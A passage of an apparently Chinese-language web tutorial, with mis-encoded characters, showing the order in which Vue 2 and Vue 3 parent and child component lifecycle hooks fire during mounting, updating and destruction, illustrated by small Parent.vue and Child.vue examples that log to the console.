 Â <span class="hljs-title function_">beforeUpdate</span>(<span class="hljs-params"/>) {
 Â  Â <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'1. çˆ¶ç»„ä»¶ beforeUpdate'</span>)
  },
 Â <span class="hljs-title function_">updated</span>(<span class="hljs-params"/>) {
 Â  Â <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'4. çˆ¶ç»„ä»¶ updated'</span>)
  }
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
â€‹
â€‹
<span class="hljs-comment">&lt;!-- Child.vue --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
 Â <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"border: 1px solid #ccc; padding: 10px; margin: 10px;"</span>&gt;</span>
 Â  Â <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>Child Component - {{ childMessage }}<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span>
 Â  Â <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">"changeChildData"</span>&gt;</span>æ”¹å˜å­ç»„ä»¶æ•°æ®<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
 Â  Â <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>è®¡æ•°: {{ count }}<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
 Â <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>
â€‹
<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {
 Â <span class="hljs-title function_">data</span>(<span class="hljs-params"/>) {
 Â  Â <span class="hljs-keyword">return</span> {
 Â  Â  Â <span class="hljs-attr">childMessage</span>: <span class="hljs-string">'å­ç»„ä»¶åˆå§‹æ•°æ®'</span>,
 Â  Â  Â <span class="hljs-attr">count</span>: <span class="hljs-number">0</span>
 Â   }
  },
 Â <span class="hljs-attr">methods</span>: {
 Â  Â <span class="hljs-title function_">changeChildData</span>(<span class="hljs-params"/>) {
 Â  Â  Â <span class="hljs-variable language_">this</span>.<span class="hljs-property">childMessage</span> = <span class="hljs-string">'å­ç»„ä»¶æ•°æ®å·²æ›´æ–°'</span>
 Â  Â  Â <span class="hljs-variable language_">this</span>.<span class="hljs-property">count</span>++
 Â  Â  Â <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'=== å­ç»„ä»¶æ•°æ®å˜åŒ–è§¦å‘ ==='</span>)
 Â   }
  },
 Â <span class="hljs-title function_">beforeUpdate</span>(<span class="hljs-params"/>) { <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Child beforeUpdate'</span>) },
 Â <span class="hljs-title function_">updated</span>(<span class="hljs-params"/>) { <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Child updated'</span>) },
â€‹
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
â€‹
â€‹
â€‹
</code></pre>
<h3 data-id="heading-15">3. ç»„ä»¶é”€æ¯é˜¶æ®µï¼ˆDestroyingï¼‰</h3>
<h4 data-id="heading-16">é”€æ¯çˆ¶ç»„ä»¶</h4>
<h5 data-id="heading-17">æ‰§è¡Œé¡ºåºï¼š</h5>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-comment">// é”€æ¯è¿‡ç¨‹</span>
â€‹
çˆ¶ç»„ä»¶ beforeDestroy
â€‹
 Â å­ç»„ä»¶ beforeDestroy
â€‹
 Â å­ç»„ä»¶ destroyed
â€‹
çˆ¶ç»„ä»¶ destroyed
</code></pre>
<h5 data-id="heading-18">ä»£ç ç¤ºä¾‹ï¼š</h5>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- Parent.vue --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
 Â <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
 Â  Â <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>çˆ¶ç»„ä»¶<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span>
 Â  Â <span class="hljs-tag">&lt;<span class="hljs-name">ChildComponent</span> <span class="hljs-attr">v-if</span>=<span class="hljs-string">"showChild"</span> /&gt;</span>
 Â  Â <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">"showChild = false"</span>&gt;</span>é”€æ¯å­ç»„ä»¶<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
 Â <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> <span class="hljs-title class_">ChildComponent</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'@/components/two/Child.vue'</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {
 Â <span class="hljs-attr">components</span>: { <span class="hljs-title class_">ChildComponent</span> },
 Â <span class="hljs-title function_">data</span>(<span class="hljs-params"/>) {
 Â  Â <span class="hljs-keyword">return</span> {
 Â  Â  Â <span class="hljs-attr">showChild</span>: <span class="hljs-literal">true</span>
 Â   }
  },
 Â <span class="hljs-title function_">beforeDestroy</span>(<span class="hljs-params"/>) {
 Â  Â <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'çˆ¶ç»„ä»¶ beforeDestroy'</span>)
  },
 Â <span class="hljs-title function_">destroyed</span>(<span class="hljs-params"/>) {
 Â  Â <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'çˆ¶ç»„ä»¶ destroyed'</span>)
  }
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
â€‹
</code></pre>
<h4 data-id="heading-19">é”€æ¯å­ç»„ä»¶</h4>
<h5 data-id="heading-20">æ‰§è¡Œé¡ºåºï¼š</h5>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-comment">// é”€æ¯è¿‡ç¨‹</span>
â€‹
 å­ç»„ä»¶ beforeDestroy
â€‹
 å­ç»„ä»¶ destroyed
â€‹
</code></pre>
<h5 data-id="heading-21">ä»£ç ç¤ºä¾‹ï¼šè§é”€æ¯çˆ¶ç»„ä»¶çš„ä»£ç </h5>
<h2 data-id="heading-22">vue3ç‰ˆæœ¬</h2>
<blockquote>
<p>ç”Ÿå‘½å‘¨æœŸï¼š</p>
<p>setupï¼ˆï¼‰æ›¿ä»£ beforeCreate setupï¼ˆï¼‰æ›¿ä»£ created onBeforeMount onMounted onBeforeUpdate onUpdated onBeforeUnmount onUnmounted onActivated onDeactivated onRenderTrackedï¼ˆæ–°å¢ï¼‰ onRenderTriggeredï¼ˆæ–°å¢ï¼‰</p>
</blockquote>
<h3 data-id="heading-23">1. ç»„ä»¶æŒ‚è½½é˜¶æ®µï¼ˆMountingï¼‰</h3>
<h4 data-id="heading-24">æ‰§è¡Œé¡ºåºï¼š</h4>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-bullet">1.</span> çˆ¶ç»„ä»¶ setup (ç›¸å½“äº beforeCreate + created)
<span class="hljs-bullet">2.</span> çˆ¶ç»„ä»¶ onBeforeMount
<span class="hljs-bullet">    3.</span> å­ç»„ä»¶ setup
<span class="hljs-code">    3.1 å­ç»„ä»¶ onBeforeMount
    4. å­ç»„ä»¶ onMounted
5. çˆ¶ç»„ä»¶ onMounted
</span></code></pre>
<h4 data-id="heading-25">ä»£ç ç¤ºä¾‹ï¼š</h4>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- Parent.vue --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
 Â <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
 Â  Â <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>çˆ¶ç»„ä»¶<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span>
 Â  Â <span class="hljs-tag">&lt;<span class="hljs-name">ChildComponent</span> /&gt;</span>
 Â <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { onBeforeMount, onMounted } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">ChildComponent</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'../Son/s1.vue'</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'1. çˆ¶ç»„ä»¶ setup (ç›¸å½“äº beforeCreate + created)'</span>)
<span class="hljs-title function_">onBeforeMount</span>(<span class="hljs-function">() =&gt;</span> {
 Â <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'2. çˆ¶ç»„ä»¶ onBeforeMount'</span>)
})
<span class="hljs-title function_">onMounted</span>(<span class="hljs-function">() =&gt;</span> {
 Â <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'5. çˆ¶ç»„ä»¶ onMounted'</span>)
})
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
â€‹
â€‹
<span class="hljs-comment">&lt;!-- Child.vue --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
 Â <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
 Â  Â <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>å­ç»„ä»¶<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span>
 Â <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { onBeforeMount, onMounted } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'3. å­ç»„ä»¶ setup'</span>)
<span class="hljs-title function_">onBeforeMount</span>(<span class="hljs-function">() =&gt;</span> {
 Â <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'3.1 å­ç»„ä»¶ onBeforeMount'</span>)
})
<span class="hljs-title function_">onMounted</span>(<span class="hljs-function">() =&gt;</span> {
 Â <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'4. å­ç»„ä»¶ onMounted'</span>)
})
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
â€‹
</code></pre>
<h3 data-id="heading-26">2. ç»„ä»¶æ›´æ–°é˜¶æ®µï¼ˆUpdatingï¼‰</h3>
<h4 data-id="heading-27">æ€»ç»“ï¼š</h4>
<blockquote>
<p>vue3ä¸­ï¼Œåªè¦çˆ¶ç»„ä»¶å¾€å­ç»„ä»¶ä¼ å…¥äº†å€¼ï¼Œå½“è¯¥å€¼æ›´æ–°æ—¶ï¼Œå­ç»„ä»¶çš„æ›´æ–°ç”Ÿå‘½å‘¨æœŸå°±ä¼šæ‰§è¡Œï¼Œå…¶ä»–æƒ…å†µï¼Œå­ç»„ä»¶çš„æ›´æ–°ç”Ÿå‘½å‘¨æœŸéƒ½ä¸ä¼šæ‰§è¡Œ</p>
</blockquote>
<h4 data-id="heading-28">æ›´æ–°çˆ¶ç»„ä»¶--å­ç»„ä»¶ä½¿ç”¨äº†ï¼Œçˆ¶ç»„ä»¶ä¼ å…¥çš„å‚æ•°</h4>
<h5 data-id="heading-29">æ‰§è¡Œé¡ºåºï¼š</h5>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-comment">// æ›´æ–°è¿‡ç¨‹ï¼ˆæ•°æ®å˜åŒ–æ—¶ï¼‰</span>
â€‹
çˆ¶ç»„ä»¶ beforeUpdate
â€‹
 Â å­ç»„ä»¶ beforeUpdate
â€‹
 Â å­ç»„ä»¶ updated
â€‹
çˆ¶ç»„ä»¶ updated
</code></pre>
<h5 data-id="heading-30">ä»£ç ç¤ºä¾‹ï¼š</h5>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- Parent.vue --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
 Â <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
 Â  Â <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>çˆ¶ç»„ä»¶ - {{ parentData }}<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span>
 Â  Â <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">"changeData"</span>&gt;</span>æ”¹å˜æ•°æ®<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
 Â  Â <span class="hljs-tag">&lt;<span class="hljs-name">ChildComponent</span> <span class="hljs-attr">:childData</span>=<span class="hljs-string">"parentData"</span> /&gt;</span>
 Â <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { ref, onBeforeUpdate, onUpdated } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">ChildComponent</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'../Son/s1.vue'</span>
<span class="hljs-keyword">const</span> parentData = <span class="hljs-title function_">ref</span>(<span class="hljs-string">'åˆå§‹å€¼'</span>)
<span class="hljs-keyword">const</span> <span class="hljs-title function_">changeData</span> = (<span class="hljs-params"/>) =&gt; {
 Â parentData.<span class="hljs-property">value</span> = <span class="hljs-string">'æ–°å€¼'</span>
}
<span class="hljs-title function_">onBeforeUpdate</span>(<span class="hljs-function">() =&gt;</span> {
 Â <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'1. çˆ¶ç»„ä»¶ onBeforeUpdate'</span>)
})
<span class="hljs-title function_">onUpdated</span>(<span class="hljs-function">() =&gt;</span> {
 Â <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'4. çˆ¶ç»„ä»¶ onUpdated'</span>)
})
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
â€‹
â€‹
<span class="hljs-comment">&lt;!-- Child.vue --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
 Â <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
 Â  Â <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>å­ç»„ä»¶ - {{ props.childData }}<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span>
 Â <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { onBeforeUpdate, onUpdated, defineProps } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
â€‹
<span class="hljs-keyword">const</span> props = <span class="hljs-title function_">defineProps</span>([<span class="hljs-string">'childData'</span>])
â€‹
<span class="hljs-title function_">onBeforeUpdate</span>(<span class="hljs-function">() =&gt;</span> {
 Â <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'2. å­ç»„ä»¶ onBeforeUpdate'</span>)
})
â€‹
<span class="hljs-title function_">onUpdated</span>(<span class="hljs-function">() =&gt;</span> {
 Â <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'3. å­ç»„ä»¶ onUpdated'</span>)
})
â€‹
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
â€‹
</code></pre>
<h4 data-id="heading-31">æ›´æ–°çˆ¶ç»„ä»¶--çˆ¶ç»„ä»¶ä¼ å€¼ç»™å­ç»„ä»¶ï¼Œå³ä½¿å­ç»„ä»¶æ²¡æœ‰ä½¿ç”¨ å’Œ å®šä¹‰å¯¹åº”çš„å±æ€§</h4>
<blockquote>
<p>å¦‚æœçˆ¶ç»„ä»¶æ²¡æœ‰ä¼ å€¼ç»™å­ç»„ä»¶ï¼Œå³ä½¿å­ç»„ä»¶å®šä¹‰ å’Œ ä½¿ç”¨äº†å€¼ï¼Œå½“çˆ¶ç»„ä»¶æ›´æ–°æ—¶ï¼Œå­ç»„ä»¶ä¹Ÿä¸ä¼šæ›´æ–°ï¼Œå³ï¼šç”Ÿå‘½å‘¨æœŸæ˜¯ï¼š</p>
<p><code>çˆ¶ç»„ä»¶ beforeUpdate</code> -&gt; <code>çˆ¶ç»„ä»¶ updated</code></p>
</blockquote>
<h5 data-id="heading-32">æ‰§è¡Œé¡ºåºï¼š</h5>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-comment">// æ›´æ–°è¿‡ç¨‹ï¼ˆæ•°æ®å˜åŒ–æ—¶ï¼‰</span>
â€‹
çˆ¶ç»„ä»¶ beforeUpdate
â€‹
 Â å­ç»„ä»¶ beforeUpdate
â€‹
 Â å­ç»„ä»¶ updated
â€‹
çˆ¶ç»„ä»¶ updated
</code></pre>
<h5 data-id="heading-33">ä»£ç ç¤ºä¾‹ï¼š</h5>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- Parent.vue --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
 Â <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
 Â  Â <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>çˆ¶ç»„ä»¶ - {{ parentData }}<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span>
 Â  Â <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">"changeData"</span>&gt;</span>æ”¹å˜æ•°æ®<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
 Â  Â <span class="hljs-tag">&lt;<span class="hljs-name">ChildComponent</span> <span class="hljs-attr">:childData</span>=<span class="hljs-string">"parentData"</span> /&gt;</span>
 Â  Â <span class="hljs-comment">&lt;!-- &lt;ChildComponent  /&gt; --&gt;</span>
 Â <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { ref, onBeforeUpdate, onUpdated } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">ChildComponent</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'../Son/s1.vue'</span>
<span class="hljs-keyword">const</span> parentData = <span class="hljs-title function_">ref</span>(<span class="hljs-string">'åˆå§‹å€¼'</span>)
<span class="hljs-keyword">const</span> <span class="hljs-title function_">changeData</span> = (<span class="hljs-params"/>) =&gt; {
 Â parentData.<span class="hljs-property">value</span> = <span class="hljs-string">'æ–°å€¼'</span>
}
<span class="hljs-title function_">onBeforeUpdate</span>(<span class="hljs-function">() =&gt;</span> {
 Â <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'1. çˆ¶ç»„ä»¶ onBeforeUpdate'</span>)
})
<span class="hljs-title function_">onUpdated</span>(<span class="hljs-function">() =&gt;</span> {
 Â <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'4. çˆ¶ç»„ä»¶ onUpdated'</span>)
})
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
â€‹
â€‹
<span class="hljs-comment">&lt;!-- Child.vue --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
 Â <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
 Â  Â <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>å­ç»„ä»¶<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span>
 Â  Â <span class="hljs-comment">&lt;!-- &lt;h3&gt;å­ç»„ä»¶ - {{ props.childData }}&lt;/h3&gt; --&gt;</span>
 Â <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { onBeforeUpdate, onUpdated, defineProps } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
â€‹
<span class="hljs-comment">// const props = defineProps(['childData'])</span>
â€‹
<span class="hljs-title function_">onBeforeUpdate</span>(<span class="hljs-function">() =&gt;</span> {
 Â <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'2. å­ç»„ä»¶ onBeforeUpdate'</span>)
})
â€‹
<span class="hljs-title function_">onUpdated</span>(<span class="hljs-function">() =&gt;</span> {
 Â <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'3. å­ç»„ä»¶ onUpdated'</span>)
})
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
â€‹
</code></pre>
<h4 data-id="heading-34">æ›´æ–°å­ç»„ä»¶</h4>
<h5 data-id="heading-35">æ‰§è¡Œé¡ºåºï¼š</h5>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-comment">// æ›´æ–°è¿‡ç¨‹ï¼ˆæ•°æ®å˜åŒ–æ—¶ï¼‰</span>
â€‹
å­ç»„ä»¶ beforeUpdate
â€‹
å­ç»„ä»¶ updated
</code></pre>
<h5 data-id="heading-36">ä»£ç ç¤ºä¾‹ï¼š</h5>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- Parent.vue --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
 Â <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
 Â  Â <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>çˆ¶ç»„ä»¶<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span>
 Â  Â <span class="hljs-comment">&lt;!-- &lt;h2&gt;çˆ¶ç»„ä»¶ - {{ parentData }}&lt;/h2&gt; --&gt;</span>
 Â  Â <span class="hljs-comment">&lt;!-- &lt;button @click="changeData"&gt;æ”¹å˜æ•°æ®&lt;/button&gt; --&gt;</span>
 Â  Â <span class="hljs-tag">&lt;<span class="hljs-name">ChildComponent</span> <span class="hljs-attr">:childData</span>=<span class="hljs-string">"parentData"</span> /&gt;</span>
 Â  Â <span class="hljs-comment">&lt;!-- &lt;ChildComponent  /&gt; --&gt;</span>
 Â <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { ref, onBeforeUpdate, onUpdated } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">ChildComponent</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'../Son/s1.vue'</span>
<span class="hljs-keyword">const</span> parentData = <span class="hljs-title function_">ref</span>(<span class="hljs-string">'åˆå§‹å€¼'</span>)
<span class="hljs-keyword">const</span> <span class="hljs-title function_">changeData</span> = (<span class="hljs-params"/>) =&gt; {
 Â parentData.<span class="hljs-property">value</span> = <span class="hljs-string">'æ–°å€¼'</span>
}
<span class="hljs-title function_">onBeforeUpdate</span>(<span class="hljs-function">() =&gt;</span> {
 Â <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'1. çˆ¶ç»„ä»¶ onBeforeUpdate'</span>)
})
<span class="hljs-title function_">onUpdated</span>(<span class="hljs-function">() =&gt;</span> {
 Â <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'4. çˆ¶ç»„ä»¶ onUpdated'</span>)
})
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
â€‹
â€‹
<span class="hljs-comment">&lt;!-- Child.vue --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
 Â <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
 Â  Â <span class="hljs-comment">&lt;!-- &lt;h3&gt;å­ç»„ä»¶&lt;/h3&gt; --&gt;</span>
 Â  Â <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>å­ç»„ä»¶ - {{ sonData }}<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span>
 Â  Â <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">"changeData"</span>&gt;</span>æ”¹å˜æ•°æ®<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
 Â <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { onBeforeUpdate, onUpdated,ref, defineProps } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
â€‹
<span class="hljs-comment">// const props = defineProps(['childData'])</span>
â€‹
<span class="hljs-keyword">const</span> sonData = <span class="hljs-title function_">ref</span>(<span class="hljs-string">'åˆå§‹å€¼'</span>)
<span class="hljs-keyword">const</span> <span class="hljs-title function_">changeData</span> = (<span class="hljs-params"/>) =&gt; {
 Â sonData.<span class="hljs-property">value</span> = <span class="hljs-string">'æ–°å€¼'</span>
}
â€‹
<span class="hljs-title function_">onBeforeUpdate</span>(<span class="hljs-function">() =&gt;</span> {
 Â <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'2. å­ç»„ä»¶ onBeforeUpdate'</span>)
})
â€‹
<span class="hljs-title function_">onUpdated</span>(<span class="hljs-function">() =&gt;</span> {
 Â <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'3. å­ç»„ä»¶ onUpdated'</span>)
})
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
â€‹
</code></pre>
<h3 data-id="heading-37">3. ç»„ä»¶é”€æ¯é˜¶æ®µï¼ˆDestroyingï¼‰</h3>
<h4 data-id="heading-38">é”€æ¯çˆ¶ç»„ä»¶</h4>
<h5 data-id="heading-39">æ‰§è¡Œé¡ºåºï¼š</h5>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-comment">// é”€æ¯è¿‡ç¨‹</span>
â€‹
çˆ¶ç»„ä»¶ beforeDestroy
â€‹
 Â å­ç»„ä»¶ beforeDestroy
â€‹
 Â å­ç»„ä»¶ destroyed
â€‹
çˆ¶ç»„ä»¶ destroyed
</code></pre>
<h5 data-id="heading-40">ä»£ç ç¤ºä¾‹ï¼š</h5>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- Parent.vue --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
 Â <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
 Â  Â <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>çˆ¶ç»„ä»¶<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span>
 Â  Â <span class="hljs-tag">&lt;<span class="hljs-name">ChildComponent</span> <span class="hljs-attr">v-if</span>=<span class="hljs-string">"showChild"</span> /&gt;</span>
 Â  Â <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">"showChild = false"</span>&gt;</span>å¸è½½å­ç»„ä»¶<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
 Â <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>
